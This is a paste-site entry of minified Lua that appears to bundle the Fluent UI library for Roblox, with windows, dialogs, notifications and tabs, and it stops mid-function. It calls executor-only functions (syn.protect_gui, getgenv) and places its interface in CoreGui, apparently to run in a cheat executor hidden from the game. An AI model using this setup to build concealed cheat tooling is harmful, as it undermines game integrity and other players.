f2d6DAMn,idk,busmanl30,Lua,Tuesday 23rd of April 2024 07:19:54 PM CDT,"local a local aa,ab,ac,ad,ae,af,ag,ai,b,d,e,g,h,i,j,k,l,m,n,o={function()local b,c,d=a(1)local e return(function(...)local f,g,h,i,j,k=game:GetService'Lighting',game:GetService'RunService',game:GetService'Players'.LocalPlayer,game:GetService'UserInputService',game:GetService'TweenService',game:GetService'Workspace'.CurrentCamera local l,m=h:GetMouse(),c local n,o,p,q=d(m.Creator),d(m.Elements),d(m.Acrylic),m.Components local r,s,t=d(q.Notification),n.New,protectgui or(syn and syn.protect_gui)or function()end local u=s('ScreenGui',{Parent=g:IsStudio()and h.PlayerGui or game:GetService'CoreGui'})t(u)r:Init(u)local v={Version='1.1.0',OpenFrames={},Options={},Themes=d(m.Themes).Names,Window=nil,WindowFrame=nil,Unloaded=false,Theme='Dark',DialogOpen=false,UseAcrylic=false,Acrylic=false,Transparency=true,MinimizeKeybind=nil,MinimizeKey=Enum.KeyCode.LeftControl,GUI=u}function v.SafeCallback(w,x,...)if not x then return end local y,z=pcall(x,...)if not y then local A,B=z:find':%d+: 'if not B then return v:Notify{Title='Interface',Content='Callback error',SubContent=z,Duration=5}end return v:Notify{Title='Interface',Content='Callback error',SubContent=z:sub(B+1),Duration=5}end end function v.Round(w,x,y)if y==0 then return math.floor(x)end x=tostring(x)return x:find'%.'and tonumber(x:sub(1,x:find'%.'+y))or x end local w=d(m.Icons).assets function v.GetIcon(x,y)if y~=nil and w['lucide-'..y]then return w['lucide-'..y]end return nil end local x={}x.__index=x x.__namecall=function(y,z,...)return x[z](...)end for y,z in ipairs(o)do x['Add'..z.__type]=function(A,B,C)z.Container=A.Container z.Type=A.Type z.ScrollFrame=A.ScrollFrame z.Library=v return z:New(B,C)end end v.Elements=x function v.CreateWindow(A,B)assert(B.Title,'Window - Missing Title')if v.Window then print'You cannot create more than one window.'return end v.MinimizeKey=B.MinimizeKey or Enum.KeyCode.LeftControl v.UseAcrylic=B.Acrylic or false v.Acrylic=B.Acrylic or false v.Theme=B.Theme or'Dark'if B.Acrylic then p.init()end local C=d(q.Window){Parent=u,Size=B.Size,Title=B.Title,SubTitle=B.SubTitle,TabWidth=B.TabWidth}v.Window=C v:SetTheme(B.Theme)return C end function v.SetTheme(A,B)if v.Window and table.find(v.Themes,B)then v.Theme=B n.UpdateTheme()end end function v.Destroy(A)if v.Window then v.Unloaded=true if v.UseAcrylic then v.Window.AcrylicPaint.Model:Destroy()end n.Disconnect()v.GUI:Destroy()end end function v.ToggleAcrylic(A,B)if v.Window then if v.UseAcrylic then v.Acrylic=B v.Window.AcrylicPaint.Model.Transparency=B and 0.98 or 1 if B then p.Enable()else p.Disable()end end end end function v.ToggleTransparency(A,B)if v.Window then v.Window.AcrylicPaint.Frame.Background.BackgroundTransparency=B and 0.35 or 0 end end function v.Notify(A,B)return r:New(B)end if getgenv then getgenv().Fluent=v end return v end)()end,function()local b,c,d=a(2)local e return(function(...)local f={AcrylicBlur=d(c.AcrylicBlur),CreateAcrylic=d(c.CreateAcrylic),AcrylicPaint=d(c.AcrylicPaint)}function f.init()local g=Instance.new'DepthOfFieldEffect'g.FarIntensity=0 g.InFocusRadius=0.1 g.NearIntensity=1 local h={}function f.Enable()for i,j in pairs(h)do j.Enabled=false end g.Parent=game:GetService'Lighting'end function f.Disable()for i,j in pairs(h)do j.Enabled=j.enabled end g.Parent=nil end local i=function()local i=function(i)if i:IsA'DepthOfFieldEffect'then h[i]={enabled=i.Enabled}end end for j,k in pairs(game:GetService'Lighting':GetChildren())do i(k)end if game:GetService'Workspace'.CurrentCamera then for l,m in pairs(game:GetService'Workspace'.CurrentCamera:GetChildren())do i(m)end end end i()f.Enable()end return f end)()end,function()local b,c,d=a(3)local e return(function(...)local f,g,h,i=d(c.Parent.Parent.Creator),d(c.Parent.CreateAcrylic),unpack(d(c.Parent.Utils))local j=Instance.new('Folder',game:GetService'Workspace'.CurrentCamera)local k=function(k)local l={}k=k or 0.001 local m,n={topLeft=Vector2.new(),topRight=Vector2.new(),bottomRight=Vector2.new()},g()n.Parent=j local o,p=function(o,p)m.topLeft=p m.topRight=p+Vector2.new(o.X,0)m.bottomRight=p+o end,function()local o=game:GetService'Workspace'.CurrentCamera if o then o=o.CFrame end local p=o if not p then p=CFrame.new()end local q,r,s,t=p,m.topLeft,m.topRight,m.bottomRight local u,v,w=h(r,k),h(s,k),h(t,k)local x,y=(v-u).Magnitude,(v-w).Magnitude n.CFrame=CFrame.fromMatrix((u+w)/2,q.XVector,q.YVector,q.ZVector)n.Mesh.Scale=Vector3.new(x,y,0)end local q,r=function(q)local r=i()local s,t=q.AbsoluteSize-Vector2.new(r,r),q.AbsolutePosition+Vector2.new(r/2,r/2)o(s,t)task.spawn(p)end,function()local q=game:GetService'Workspace'.CurrentCamera if not q then return end table.insert(l,q:GetPropertyChangedSignal'CFrame':Connect(p))table.insert(l,q:GetPropertyChangedSignal'ViewportSize':Connect(p))table.insert(l,q:GetPropertyChangedSignal'FieldOfView':Connect(p))task.spawn(p)end n.Destroying:Connect(function()for s,t in l do pcall(function()t:Disconnect()end)end end)r()return q,n end return function(l)local m,n,o={},k(l)local p=f.New('Frame',{BackgroundTransparency=1,Size=UDim2.fromScale(1,1)})f.AddSignal(p:GetPropertyChangedSignal'AbsolutePosition',function()n(p)end)f.AddSignal(p:GetPropertyChangedSignal'AbsoluteSize',function()n(p)end)m.AddParent=function(q)f.AddSignal(q:GetPropertyChangedSignal'Visible',function()m.SetVisibility(q.Visible)end)end m.SetVisibility=function(q)o.Transparency=q and 0.98 or 1 end m.Frame=p m.Model=o return m end end)()end,function()local b,c,d=a(4)local e return(function(...)local f,g=d(c.Parent.Parent.Creator),d(c.Parent.AcrylicBlur)local h=f.New return function(i)local j={}j.Frame=h('Frame',{Size=UDim2.fromScale(1,1),BackgroundTransparency=0.9,BackgroundColor3=Color3.fromRGB(255,255,255),BorderSizePixel=0},{h('ImageLabel',{Image='rbxassetid://8992230677',ScaleType='Slice',SliceCenter=Rect.new(Vector2.new(99,99),Vector2.new(99,99)),AnchorPoint=Vector2.new(0.5,0.5),Size=UDim2.new(1,120,1,116),Position=UDim2.new(0.5,0,0.5,0),BackgroundTransparency=1,ImageColor3=Color3.fromRGB(0,0,0),ImageTransparency=0.7}),h('UICorner',{CornerRadius=UDim.new(0,8)}),h('Frame',{BackgroundTransparency=0.45,Size=UDim2.fromScale(1,1),Name='Background',ThemeTag={BackgroundColor3='AcrylicMain'}},{h('UICorner',{CornerRadius=UDim.new(0,8)})}),h('Frame',{BackgroundColor3=Color3.fromRGB(255,255,255),BackgroundTransparency=0.4,Size=UDim2.fromScale(1,1)},{h('UICorner',{CornerRadius=UDim.new(0,8)}),h('UIGradient',{Rotation=90,ThemeTag={Color='AcrylicGradient'}})}),h('ImageLabel',{Image='rbxassetid://9968344105',ImageTransparency=0.98,ScaleType=Enum.ScaleType.Tile,TileSize=UDim2.new(0,128,0,128),Size=UDim2.fromScale(1,1),BackgroundTransparency=1},{h('UICorner',{CornerRadius=UDim.new(0,8)})}),h('ImageLabel',{Image='rbxassetid://9968344227',ImageTransparency=0.9,ScaleType=Enum.ScaleType.Tile,TileSize=UDim2.new(0,128,0,128),Size=UDim2.fromScale(1,1),BackgroundTransparency=1,ThemeTag={ImageTransparency='AcrylicNoise'}},{h('UICorner',{CornerRadius=UDim.new(0,8)})}),h('Frame',{BackgroundTransparency=1,Size=UDim2.fromScale(1,1),ZIndex=2},{h('UICorner',{CornerRadius=UDim.new(0,8)}),h('UIStroke',{Transparency=0.5,Thickness=1,ThemeTag={Color='AcrylicBorder'}})})})local k if d(c.Parent.Parent).UseAcrylic then k=g()k.Frame.Parent=j.Frame j.Model=k.Model j.AddParent=k.AddParent j.SetVisibility=k.SetVisibility end return j end end)()end,function()local b,c,d=a(5)local e return(function(...)local f=c.Parent.Parent local g=d(f.Creator)local h=function()local h=g.New('Part',{Name='Body',Color=Color3.new(0,0,0),Material=Enum.Material.Glass,Size=Vector3.new(1,1,0),Anchored=true,CanCollide=false,Locked=true,CastShadow=false,Transparency=0.98},{g.New('SpecialMesh',{MeshType=Enum.MeshType.Brick,Offset=Vector3.new(0,0,-1E-6)})})return h end return h end)()end,function()local b,c,d=a(6)local e return(function(...)local f,g=function(f,g,h,i,j)return(f-g)*(j-i)/(h-g)+i end,function(f,g)local h=game:GetService'Workspace'.CurrentCamera:ScreenPointToRay(f.X,f.Y)return h.Origin+h.Direction*g end local h=function()local h=game:GetService'Workspace'.CurrentCamera.ViewportSize.Y return f(h,0,2560,8,56)end return{g,h}end)()end,[8]=function()local b,c,d=a(8)local e return(function(...)return{Close='rbxassetid://9886659671',Min='rbxassetid://9886659276',Max='rbxassetid://9886659406',Restore='rbxassetid://9886659001'}end)()end,[9]=function()local b,c,d=a(9)local e return(function(...)local f=c.Parent.Parent local g,h=d(f.Packages.Flipper),d(f.Creator)local i,j=h.New,g.Spring.new return function(k,l,m)m=m or false local n={}n.Title=i('TextLabel',{FontFace=Font.new'rbxasset://fonts/families/GothamSSm.json',TextColor3=Color3.fromRGB(200,200,200),TextSize=14,TextWrapped=true,TextXAlignment=Enum.TextXAlignment.Center,TextYAlignment=Enum.TextYAlignment.Center,BackgroundColor3=Color3.fromRGB(255,255,255),AutomaticSize=Enum.AutomaticSize.Y,BackgroundTransparency=1,Size=UDim2.fromScale(1,1),ThemeTag={TextColor3='Text'}})n.HoverFrame=i('Frame',{Size=UDim2.fromScale(1,1),BackgroundTransparency=1,ThemeTag={BackgroundColor3='Hover'}},{i('UICorner',{CornerRadius=UDim.new(0,4)})})n.Frame=i('TextButton',{Size=UDim2.new(0,0,0,32),Parent=l,ThemeTag={BackgroundColor3='DialogButton'}},{i('UICorner',{CornerRadius=UDim.new(0,4)}),i('UIStroke',{ApplyStrokeMode=Enum.ApplyStrokeMode.Border,Transparency=0.65,ThemeTag={Color='DialogButtonBorder'}}),n.HoverFrame,n.Title})local o,p=h.SpringMotor(1,n.HoverFrame,'BackgroundTransparency',m)h.AddSignal(n.Frame.MouseEnter,function()p(0.97)end)h.AddSignal(n.Frame.MouseLeave,function()p(1)end)h.AddSignal(n.Frame.MouseButton1Down,function()p(1)end)h.AddSignal(n.Frame.MouseButton1Up,function()p(0.97)end)return n end end)()end,[10]=function()local b,c,d=a(10)local e return(function(...)local f,g,h,i=game:GetService'UserInputService',game:GetService'Players'.LocalPlayer:GetMouse(),game:GetService'Workspace'.CurrentCamera,c.Parent.Parent local j,k=d(i.Packages.Flipper),d(i.Creator)local l,m,n,o=j.Spring.new,j.Instant.new,k.New,{Window=nil}function o.Init(p,q)o.Window=q return o end function o.Create(p)local q={Buttons=0}q.TintFrame=n('TextButton',{Text='',Size=UDim2.fromScale(1,1),BackgroundColor3=Color3.fromRGB(0,0,0),BackgroundTransparency=1,Parent=o.Window.Root},{n('UICorner',{CornerRadius=UDim.new(0,8)})})local r,s=k.SpringMotor(1,q.TintFrame,'BackgroundTransparency',true)q.ButtonHolder=n('Frame',{Size=UDim2.new(1,-40,1,-40),AnchorPoint=Vector2.new(0.5,0.5),Position=UDim2.fromScale(0.5,0.5),BackgroundTransparency=1},{n('UIListLayout',{Padding=UDim.new(0,10),FillDirection=Enum.FillDirection.Horizontal,HorizontalAlignment=Enum.HorizontalAlignment.Center,SortOrder=Enum.SortOrder.LayoutOrder})})q.ButtonHolderFrame=n('Frame',{Size=UDim2.new(1,0,0,70),Position=UDim2.new(0,0,1,-70),ThemeTag={BackgroundColor3='DialogHolder'}},{n('Frame',{Size=UDim2.new(1,0,0,1),ThemeTag={BackgroundColor3='DialogHolderLine'}}),q.ButtonHolder})q.Title=n('TextLabel',{FontFace=Font.new('rbxasset://fonts/families/GothamSSm.json',Enum.FontWeight.SemiBold,Enum.FontStyle.Normal),Text='Dialog',TextColor3=Color3.fromRGB(240,240,240),TextSize=22,TextXAlignment=Enum.TextXAlignment.Left,Size=UDim2.new(1,0,0,22),Position=UDim2.fromOffset(20,25),BackgroundColor3=Color3.fromRGB(255,255,255),BackgroundTransparency=1,ThemeTag={TextColor3='Text'}})q.Scale=n('UIScale',{Scale=1})local t,u=k.SpringMotor(1.1,q.Scale,'Scale')q.Root=n('CanvasGroup',{Size=UDim2.fromOffset(300,165),AnchorPoint=Vector2.new(0.5,0.5),Position=UDim2.fromScale(0.5,0.5),GroupTransparency=1,Parent=q.TintFrame,ThemeTag={BackgroundColor3='Dialog'}},{n('UICorner',{CornerRadius=UDim.new(0,8)}),n('UIStroke',{Transparency=0.5,ThemeTag={Color='DialogBorder'}}),q.Scale,q.Title,q.ButtonHolderFrame})local v,w=k.SpringMotor(1,q.Root,'GroupTransparency')function q.Open(x)d(i).DialogOpen=true q.Scale.Scale=1.1 s(0.75)w(0)u(1)end function q.Close(x)d(i).DialogOpen=false s(1)w(1)u(1.1)q.Root.UIStroke:Destroy()task.wait(0.15)q.TintFrame:Destroy()end function q.Button(x,y,z)q.Buttons=q.Buttons+1 y=y or'Button'z=z or function()end local A=d(i.Components.Button)('',q.ButtonHolder,true)A.Title.Text=y for B,C in next,q.ButtonHolder:GetChildren()do if C:IsA'TextButton'then C.Size=UDim2.new(1/q.Buttons,-(((q.Buttons-1)*10)/q.Buttons),0,32)end end k.AddSignal(A.Frame.MouseButton1Click,function()d(i):SafeCallback(z)pcall(function()q:Close()end)end)return A end return q end return o end)()end,[11]=function()local b,c,d=a(11)local e return(function(...)local f=c.Parent.Parent local g,h=d(f.Packages.Flipper),d(f.Creator)local i,j=h.New,g.Spring.new return function(k,l,m,n)local o={}o.TitleLabel=i('TextLabel',{FontFace=Font.new('rbxasset://fonts/families/GothamSSm.json',Enum.FontWeight.Medium,Enum.FontStyle.Normal),Text=k,TextColor3=Color3.fromRGB(240,240,240),TextSize=13,TextXAlignment=Enum.TextXAlignment.Left,Size=UDim2.new(1,0,0,14),BackgroundColor3=Color3.fromRGB(255,255,255),BackgroundTransparency=1,ThemeTag={TextColor3='Text'}})o.DescLabel=i('TextLabel',{FontFace=Font.new'rbxasset://fonts/families/GothamSSm.json',Text=l,TextColor3=Color3.fromRGB(200,200,200),TextSize=12,TextWrapped=true,TextXAlignment=Enum.TextXAlignment.Left,BackgroundColor3=Color3.fromRGB(255,255,255),AutomaticSize=Enum.AutomaticSize.Y,BackgroundTransparency=1,Size=UDim2.new(1,0,0,14),ThemeTag={TextColor3='SubText'}})o.LabelHolder=i('Frame',{AutomaticSize=Enum.AutomaticSize.Y,BackgroundColor3=Color3.fromRGB(255,255,255),BackgroundTransparency=1,Position=UDim2.fromOffset(10,0),Size=UDim2.new(1,-28,0,0)},{i('UIListLayout',{SortOrder=Enum.SortOrder.LayoutOrder,VerticalAlignment=Enum.VerticalAlignment.Center}),i('UIPadding',{PaddingBottom=UDim.new(0,13),PaddingTop=UDim.new(0,13)}),o.TitleLabel,o.DescLabel})o.Border=i('UIStroke',{Transparency=0.5,ApplyStrokeMode=Enum.ApplyStrokeMode.Border,Color=Color3.fromRGB(0,0,0),ThemeTag={Color='ElementBorder'}})o.Frame=i('TextButton',{Size=UDim2.new(1,0,0,0),BackgroundTransparency=0.89,BackgroundColor3=Color3.fromRGB(130,130,130),Parent=m,AutomaticSize=Enum.AutomaticSize.Y,Text='',LayoutOrder=7,ThemeTag={BackgroundColor3='Element',BackgroundTransparency='ElementTransparency'}},{i('UICorner',{CornerRadius=UDim.new(0,4)}),o.Border,o.LabelHolder})function o.SetTitle(p,q)o.TitleLabel.Text=q end function o.SetDesc(p,q)if q==nil then q=''end if q==''then o.DescLabel.Visible=false else o.DescLabel.Visible=true end o.DescLabel.Text=q end function o.Destroy(p)o.Frame:Destroy()end o:SetTitle(k)o:SetDesc(l)if n then local p,q,r=f.Themes,h.SpringMotor(h.GetThemeProperty'ElementTransparency',o.Frame,'BackgroundTransparency',false,true)h.AddSignal(o.Frame.MouseEnter,function()r(h.GetThemeProperty'ElementTransparency'-h.GetThemeProperty'HoverChange')end)h.AddSignal(o.Frame.MouseLeave,function()r(h.GetThemeProperty'ElementTransparency')end)h.AddSignal(o.Frame.MouseButton1Down,function()r(h.GetThemeProperty'ElementTransparency'+h.GetThemeProperty'HoverChange')end)h.AddSignal(o.Frame.MouseButton1Up,function()r(h.GetThemeProperty'ElementTransparency'-h.GetThemeProperty'HoverChange')end)end return o end end)()end,[12]=function()local b,c,d=a(12)local e return(function(...)local f=c.Parent.Parent local g,h,i=d(f.Packages.Flipper),d(f.Creator),d(f.Acrylic)local j,k,l,m=g.Spring.new,g.Instant.new,h.New,{}function m.Init(n,o)m.Holder=l('Frame',{Position=UDim2.new(1,-30,1,-30),Size=UDim2.new(0,310,1,-30),AnchorPoint=Vector2.new(1,1),BackgroundTransparency=1,Parent=o},{l('UIListLayout',{HorizontalAlignment=Enum.HorizontalAlignment.Center,SortOrder=Enum.SortOrder.LayoutOrder,VerticalAlignment=Enum.VerticalAlignment.Bottom,Padding=UDim.new(0,20)})})end function m.New(n,o)o.Title=o.Title or'Title'o.Content=o.Content or'Content'o.SubContent=o.SubContent or''o.Duration=o.Duration or nil o.Buttons=o.Buttons or{}local p={Closed=false}p.AcrylicPaint=i.AcrylicPaint()p.Title=l('TextLabel',{Position=UDim2.new(0,14,0,17),Text=o.Title,RichText=true,TextColor3=Color3.fromRGB(255,255,255),TextTransparency=0,FontFace=Font.new'rbxasset://fonts/families/GothamSSm.json',TextSize=13,TextXAlignment='Left',TextYAlignment='Center',Size=UDim2.new(1,-12,0,12),TextWrapped=true,BackgroundTransparency=1,ThemeTag={TextColor3='Text'}})p.ContentLabel=l('TextLabel',{FontFace=Font.new'rbxasset://fonts/families/GothamSSm.json',Text=o.Content,TextColor3=Color3.fromRGB(240,240,240),TextSize=14,TextXAlignment=Enum.TextXAlignment.Left,AutomaticSize=Enum.AutomaticSize.Y,Size=UDim2.new(1,0,0,14),BackgroundColor3=Color3.fromRGB(255,255,255),BackgroundTransparency=1,TextWrapped=true,ThemeTag={TextColor3='Text'}})p.SubContentLabel=l('TextLabel',{FontFace=Font.new'rbxasset://fonts/families/GothamSSm.json',Text=o.SubContent,TextColor3=Color3.fromRGB(240,240,240),TextSize=14,TextXAlignment=Enum.TextXAlignment.Left,AutomaticSize=Enum.AutomaticSize.Y,Size=UDim2.new(1,0,0,14),BackgroundColor3=Color3.fromRGB(255,255,255),BackgroundTransparency=1,TextWrapped=true,ThemeTag={TextColor3='SubText'}})p.LabelHolder=l('Frame',{AutomaticSize=Enum.AutomaticSize.Y,BackgroundColor3=Color3.fromRGB(255,255,255),BackgroundTransparency=1,Position=UDim2.fromOffset(14,40),Size=UDim2.new(1,-28,0,0)},{l('UIListLayout',{SortOrder=Enum.SortOrder.LayoutOrder,VerticalAlignment=Enum.VerticalAlignment.Center,Padding=UDim.new(0,3)}),p.ContentLabel,p.SubContentLabel})p.CloseButton=l('TextButton',{Text='',Position=UDim2.new(1,-14,0,13),Size=UDim2.fromOffset(20,20),AnchorPoint=Vector2.new(1,0),BackgroundTransparency=1},{l('ImageLabel',{Image=d(c.Parent.Assets).Close,Size=UDim2.fromOffset(16,16),Position=UDim2.fromScale(0.5,0.5),AnchorPoint=Vector2.new(0.5,0.5),BackgroundTransparency=1,ThemeTag={ImageColor3='Text'}})})p.Root=l('Frame',{BackgroundTransparency=1,Size=UDim2.new(1,0,1,0),Position=UDim2.fromScale(1,0)},{p.AcrylicPaint.Frame,p.Title,p.CloseButton,p.LabelHolder})if o.Content==''then p.ContentLabel.Visible=false end if o.SubContent==''then p.SubContentLabel.Visible=false end p.Holder=l('Frame',{BackgroundTransparency=1,Size=UDim2.new(1,0,0,200),Parent=m.Holder},{p.Root})local q=g.GroupMotor.new{Scale=1,Offset=60}q:onStep(function(r)p.Root.Position=UDim2.new(r.Scale,r.Offset,0,0)end)h.AddSignal(p.CloseButton.MouseButton1Click,function()p:Close()end)function p.Open(r)local s=p.LabelHolder.AbsoluteSize.Y p.Holder.Size=UDim2.new(1,0,0,58+s)q:setGoal{Scale=j(0,{frequency=5}),Offset=j(0,{frequency=5})}end function p.Close(r)if not p.Closed then p.Closed=true task.spawn(function()q:setGoal{Scale=j(1,{frequency=5}),Offset=j(60,{frequency=5})}task.wait(0.4)if d(f).UseAcrylic then p.AcrylicPaint.Model:Destroy()end p.Holder:Destroy()end)end end p:Open()if o.Duration then task.delay(o.Duration,function()p:Close()end)end return p end return m end)()end,[13]=function()local b,c,d=a(13)local e return(function(...)local f=c.Parent.Parent local g=d(f.Creator)local h=g.New return function(i,j)local k={}k.Layout=h('UIListLayout',{Padding=UDim.new(0,5)})k.Container=h('Frame',{Size=UDim2.new(1,0,0,26),Position=UDim2.fromOffset(0,24),BackgroundTransparency=1},{k.Layout})k.Root=h('Frame',{BackgroundTransparency=1,Size=UDim2.new(1,0,0,26),LayoutOrder=7,Parent=j},{h('TextLabel',{RichText=true,Text=i,TextTransparency=0,FontFace=Font.new('rbxassetid://12187365364',Enum.FontWeight.SemiBold,Enum.FontStyle.Normal),TextSize=18,TextXAlignment='Left',TextYAlignment='Center',Size=UDim2.new(1,-16,0,18),Position=UDim2.fromOffset(0,2),ThemeTag={TextColor3='Text'}}),k.Container})g.AddSignal(k.Layout:GetPropertyChangedSignal'AbsoluteContentSize',function()k.Container.Size=UDim2.new(1,0,0,k.Layout.AbsoluteContentSize.Y)k.Root.Size=UDim2.new(1,0,0,k.Layout.AbsoluteContentSize.Y+25)end)return k end end)()end,[14]=function()local b,c,d=a(14)local e return(function(...)local f=c.Parent.Parent local g,h=d(f.Packages.Flipper),d(f.Creator)local i,j,k,l,m=h.New,g.Spring.new,g.Instant.new,f.Components,{Window=nil,Tabs={},Containers={},SelectedTab=0,TabCount=0}function m.Init(n,o)m.Window=o return m end function m.GetCurrentTabPos(n)local o,p=m.Window.TabHolder.AbsolutePosition.Y,m.Tabs[m.SelectedTab].Frame.AbsolutePosition.Y return p-o end function m.New(n,o,p,q)local r,s=d(f),m.Window local t=r.Elements m.TabCount=m.TabCount+1 local u,v=m.TabCount,{Selected=false,Name=o,Type='Tab'}if r:GetIcon(p)then p=r:GetIcon(p)end if p==''or nil then p=nil end v.Frame=i('TextButton',{Size=UDim2.new(1,0,0,34),BackgroundTransparency=1,Parent=q,ThemeTag={BackgroundColor3='Tab'}},{i('UICorner',{CornerRadius=UDim.new(0,6)}),i('TextLabel',{AnchorPoint=Vector2.new(0,0.5),Position=p and UDim2.new(0,30,0.5,0)or UDim2.new(0,12,0.5,0),Text=o,RichText=true,TextColor3=Color3.fromRGB(255,255,255),TextTransparency=0,FontFace=Font.new('rbxasset://fonts/families/GothamSSm.json',Enum.FontWeight.Regular,Enum.FontStyle.Normal),TextSize=12,TextXAlignment='Left',TextYAlignment='Center',Size=UDim2.new(1,-12,1,0),BackgroundTransparency=1,ThemeTag={TextColor3='Text'}}),i('ImageLabel',{AnchorPoint=Vector2.new(0,0.5),Size=UDim2.fromOffset(16,16),Position=UDim2.new(0,8,0.5,0),BackgroundTransparency=1,Image=p and p or nil,ThemeTag={ImageColor3='Text'}})})local w=i('UIListLayout',{Padding=UDim.new(0,5),SortOrder=Enum.SortOrder.LayoutOrder})v.ContainerFrame=i('ScrollingFrame',{Size=UDim2.fromScale(1,1),BackgroundTransparency=1,Parent=s.ContainerHolder,Visible=false,BottomImage='rbxassetid://6889812791',MidImage='rbxassetid://6889812721',TopImage='rbxassetid://6276641225',ScrollBarImageColor3=Color3.fromRGB(255,255,255),ScrollBarImageTransparency=0.95,ScrollBarThickness=3,BorderSizePixel=0,CanvasSize=UDim2.fromScale(0,0),ScrollingDirection=Enum.ScrollingDirection.Y},{w,i('UIPadding',{PaddingRight=UDim.new(0,10),PaddingLeft=UDim.new(0,1),PaddingTop=UDim.new(0,1),PaddingBottom=UDim.new(0,1)})})h.AddSignal(w:GetPropertyChangedSignal'AbsoluteContentSize',function()v.ContainerFrame.CanvasSize=UDim2.new(0,0,0,w.AbsoluteContentSize.Y+2)end)v.Motor,v.SetTransparency=h.SpringMotor(1,v.Frame,'BackgroundTransparency')h.AddSignal(v.Frame.MouseEnter,function()v.SetTransparency(v.Selected and 0.85 or 0.89)end)h.AddSignal(v.Frame.MouseLeave,function()v.SetTransparency(v.Selected and 0.89 or 1)end)h.AddSignal(v.Frame.MouseButton1Down,function()v.SetTransparency(0.92)end)h.AddSignal(v.Frame.MouseButton1Up,function()v.SetTransparency(v.Selected and 0.85 or 0.89)end)h.AddSignal(v.Frame.MouseButton1Click,function()m:SelectTab(u)end)m.Containers[u]=v.ContainerFrame m.Tabs[u]=v v.Container=v.ContainerFrame v.ScrollFrame=v.Container function v.AddSection(x,y)local z,A={Type='Section'},d(l.Section)(y,v.Container)z.Container=A.Container z.ScrollFrame=v.Container setmetatable(z,t)return z end setmetatable(v,t)return v end function m.SelectTab(n,o)local p=m.Window m.SelectedTab=o for q,r in next,m.Tabs do r.SetTransparency(1)r.Selected=false end m.Tabs[o].SetTransparency(0.89)m.Tabs[o].Selected=true p.TabDisplay.Text=m.Tabs[o].Name p.SelectorPosMotor:setGoal(j(m:GetCurrentTabPos(),{frequency=6}))task.spawn(function()p.ContainerHolder.Parent=p.ContainerAnim p.ContainerPosMotor:setGoal(j(15,{frequency=10}))p.ContainerBackMotor:setGoal(j(1,{frequency=10}))task.wait(0.12)for s,t in next,m.Containers do t.Visible=false end m.Containers[o].Visible=true p.ContainerPosMotor:setGoal(j(0,{frequency=5}))p.ContainerBackMotor:setGoal(j(0,{frequency=8}))task.wait(0.12)p.ContainerHolder.Parent=p.ContainerCanvas end)end return m end)()end,[15]=function()local b,c,d=a(15)local e return(function(...)local f,g=game:GetService'TextService',c.Parent.Parent local h,i=d(g.Packages.Flipper),d(g.Creator)local j=i.New return function(k,l)l=l or false local m={}m.Input=j('TextBox',{FontFace=Font.new'rbxasset://fonts/families/GothamSSm.json',TextColor3=Color3.fromRGB(200,200,200),TextSize=14,TextXAlignment=Enum.TextXAlignment.Left,TextYAlignment=Enum.TextYAlignment.Center,BackgroundColor3=Color3.fromRGB(255,255,255),AutomaticSize=Enum.AutomaticSize.Y,BackgroundTransparency=1,Size=UDim2.fromScale(1,1),Position=UDim2.fromOffset(10,0),ThemeTag={TextColor3='Text',PlaceholderColor3='SubText'}})m.Container=j('Frame',{BackgroundTransparency=1,ClipsDescendants=true,Position=UDim2.new(0,6,0,0),Size=UDim2.new(1,-12,1,0)},{m.Input})m.Indicator=j('Frame',{Size=UDim2.new(1,-4,0,1),Position=UDim2.new(0,2,1,0),AnchorPoint=Vector2.new(0,1),BackgroundTransparency=l and 0.5 or 0,ThemeTag={BackgroundColor3=l and'InputIndicator'or'DialogInputLine'}})m.Frame=j('Frame',{Size=UDim2.new(0,0,0,30),BackgroundTransparency=l and 0.9 or 0,Parent=k,ThemeTag={BackgroundColor3=l and'Input'or'DialogInput'}},{j('UICorner',{CornerRadius=UDim.new(0,4)}),j('UIStroke',{ApplyStrokeMode=Enum.ApplyStrokeMode.Border,Transparency=l and 0.5 or 0.65,ThemeTag={Color=l and'InElementBorder'or'DialogButtonBorder'}}),m.Indicator,m.Container})local n=function()local n,o=2,m.Container.AbsoluteSize.X if not m.Input:IsFocused()or m.Input.TextBounds.X<=o-2*n then m.Input.Position=UDim2.new(0,n,0,0)else local p=m.Input.CursorPosition if p~=-1 then local q=string.sub(m.Input.Text,1,p-1)local r=f:GetTextSize(q,m.Input.TextSize,m.Input.Font,Vector2.new(math.huge,math.huge)).X local s=m.Input.Position.X.Offset+r if s<n then m.Input.Position=UDim2.fromOffset(n-r,0)elseif s>o-n-1 then m.Input.Position=UDim2.fromOffset(o-r-n-1,0)end end end end task.spawn(n)i.AddSignal(m.Input:GetPropertyChangedSignal'Text',n)i.AddSignal(m.Input:GetPropertyChangedSignal'CursorPosition',n)i.AddSignal(m.Input.Focused,function()n()m.Indicator.Size=UDim2.new(1,-2,0,2)m.Indicator.Position=UDim2.new(0,1,1,0)m.Indicator.BackgroundTransparency=0 i.OverrideTag(m.Frame,{BackgroundColor3=l and'InputFocused'or'DialogHolder'})i.OverrideTag(m.Indicator,{BackgroundColor3='Accent'})end)i.AddSignal(m.Input.FocusLost,function()n()m.Indicator.Size=UDim2.new(1,-4,0,1)m.Indicator.Position=UDim2.new(0,2,1,0)m.Indicator.BackgroundTransparency=0.5 i.OverrideTag(m.Frame,{BackgroundColor3=l and'Input'or'DialogInput'})i.OverrideTag(m.Indicator,{BackgroundColor3=l and'InputIndicator'or'DialogInputLine'})end)return m end end)()end,[16]=function()local b,c,d=a(16)local e return(function(...)local f,g=c.Parent.Parent,d(c.Parent.Assets)local h,i=d(f.Creator),d(f.Packages.Flipper)local j,k=h.New,h.AddSignal return function(l)local m,n,o={},d(f),function(m,n,o,p)local q={Callback=p or function()end}q.Frame=j('TextButton',{Size=UDim2.new(0,34,1,-8),AnchorPoint=Vector2.new(1,0),BackgroundTransparency=1,Parent=o,Position=n,Text='',ThemeTag={BackgroundColor3='Text'}},{j('UICorner',{CornerRadius=UDim.new(0,7)}),j('ImageLabel',{Image=m,Size=UDim2.fromOffset(16,16),Position=UDim2.fromScale(0.5,0.5),AnchorPoint=Vector2.new(0.5,0.5),BackgroundTransparency=1,Name='Icon',ThemeTag={ImageColor3='Text'}})})local r,s=h.SpringMotor(1,q.Frame,'BackgroundTransparency')k(q.Frame.MouseEnter,function()s(0.94)end)k(q.Frame.MouseLeave,function()s(1,true)end)k(q.Frame.MouseButton1Down,function()s(0.96)end)k(q.Frame.MouseButton1Up,function()s(0.94)end)k(q.Frame.MouseButton1Click,q.Callback)q.SetCallback=function(t)q.Callback=t end return q end 